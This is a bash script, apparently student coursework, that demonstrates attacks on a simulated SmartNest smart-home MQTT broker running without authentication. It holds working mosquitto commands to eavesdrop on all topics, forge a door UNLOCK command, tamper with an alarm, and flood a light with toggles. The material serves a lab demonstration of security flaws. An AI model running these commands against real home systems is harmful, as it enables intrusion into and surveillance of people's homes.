#!/usr/bin/env bash
# ==============================================================================
# SmartNest CW1 - Attack 1: MQTT Eavesdropping & Command Injection
# ==============================================================================
# This script demonstrates two vulnerabilities in the SmartNest smart home
# platform that arise from running an MQTT broker without TLS or authentication:
#
#   1. Confidentiality breach - any client can subscribe and read all traffic
#   2. Integrity / Authentication breach - any client can forge commands
#
# Prerequisite: SmartNest stack is running (`docker compose up`)
# ==============================================================================

set -e

# Container network name (check with: docker network ls)
NETWORK="security_and_privacy_group_8_smartnest"
BROKER_HOST="broker"
BROKER_PORT="1883"

# Helper to run mosquitto clients inside an ephemeral container on the same network
mqtt() {
    docker run --rm --network "${NETWORK}" eclipse-mosquitto:2 "$@"
}

print_step() {
    echo ""
    echo "=============================================="
    echo "  $1"
    echo "=============================================="
}

# ------------------------------------------------------------------------------
# STEP 1: Passive eavesdropping
# ------------------------------------------------------------------------------
# Subscribe to ALL topics with a wildcard. This proves that no authentication
# is required to read every device state and user activity in the home.
# ------------------------------------------------------------------------------
attack_eavesdrop() {
    print_step "STEP 1: Passive eavesdropping (Ctrl+C to stop)"
    echo "Subscribing to home/# - all device traffic will be printed in plaintext"
    sleep 2
    mqtt mosquitto_sub -h "${BROKER_HOST}" -p "${BROKER_PORT}" -t 'home/#' -v
}

# ------------------------------------------------------------------------------
# STEP 2: Forge an UNLOCK command
# ------------------------------------------------------------------------------
# Without any credentials, publish a fake UNLOCK command to the lock topic.
# The broker accepts and forwards it; the simulated lock executes it.
# ------------------------------------------------------------------------------
attack_unlock() {
    print_step "STEP 2: Forging UNLOCK command from 'attacker'"

    PAYLOAD='{"device_id":"lock_01","device_type":"lock","timestamp":1712200000,"version":"1.0","action":"UNLOCK","issued_by":"attacker"}'

    echo "Target topic : home/lock/command"
    echo "Payload      : ${PAYLOAD}"
    echo ""

    mqtt mosquitto_pub -h "${BROKER_HOST}" -p "${BROKER_PORT}" \
        -t 'home/lock/command' -m "${PAYLOAD}"

    echo "[OK] Command injected. Refresh the dashboard - lock should now be UNLOCKED."
}

# ------------------------------------------------------------------------------
# STEP 3: Forge alarm tampering
# ------------------------------------------------------------------------------
# Bonus: change the user's morning alarm to mess with their day.
# Demonstrates that any device's state can be manipulated.
# ------------------------------------------------------------------------------
attack_alarm() {
    print_step "STEP 3: Tampering with alarm clock"

    PAYLOAD='{"device_id":"alarm_01","device_type":"alarm","timestamp":1712200000,"version":"1.0","action":"SET_ALARM","issued_by":"attacker","params":{"alarm_time":"03:00","repeat":["MON","TUE","WED","THU","FRI","SAT","SUN"],"volume":100}}'

    mqtt mosquitto_pub -h "${BROKER_HOST}" -p "${BROKER_PORT}" \
        -t 'home/alarm/command' -m "${PAYLOAD}"

    echo "[OK] Alarm reset to 03:00 every day at max volume."
}

# ------------------------------------------------------------------------------
# STEP 4: Light flooding (denial-of-service style)
# ------------------------------------------------------------------------------
# Rapidly toggle the light. Demonstrates lack of rate limiting on the broker.
# ------------------------------------------------------------------------------
attack_flood() {
    print_step "STEP 4: Flooding light with rapid toggle commands"

    for i in {1..20}; do
        STATE=$([ $((i % 2)) -eq 0 ] && echo "ON" || echo "OFF")
        PAYLOAD="{\"device_id\":\"light_01\",\"device_type\":\"light\",\"timestamp\":1712200000,\"version\":\"1.0\",\"action\":\"${STATE}\",\"issued_by\":\"attacker\"}"
        mqtt mosquitto_pub -h "${BROKER_HOST}" -p "${BROKER_PORT}" \
            -t 'home/light/command' -m "${PAYLOAD}" &
    done
    wait
    echo "[OK] Sent 20 rapid toggles - broker accepted all of them."
}

# ------------------------------------------------------------------------------
# Main menu
# ------------------------------------------------------------------------------
case "${1:-menu}" in
    eavesdrop) attack_eavesdrop ;;
    unlock)    attack_unlock ;;
    alarm)     attack_alarm ;;
    flood)     attack_flood ;;
    all)
        attack_unlock
        sleep 1
        attack_alarm
        sleep 1
        attack_flood
        ;;
    *)
        echo "SmartNest MQTT Attack Toolkit"
        echo ""
        echo "Usage: $0 <command>"
        echo ""
        echo "Commands:"
        echo "  eavesdrop  - Passively sniff all MQTT traffic"
        echo "  unlock     - Forge an UNLOCK command on the lock"
        echo "  alarm      - Tamper with the alarm schedule"
        echo "  flood      - Flood the light with rapid toggles"
        echo "  all        - Run unlock + alarm + flood in sequence"
        echo ""
        echo "Example:"
        echo "  $0 unlock"
        ;;
esac
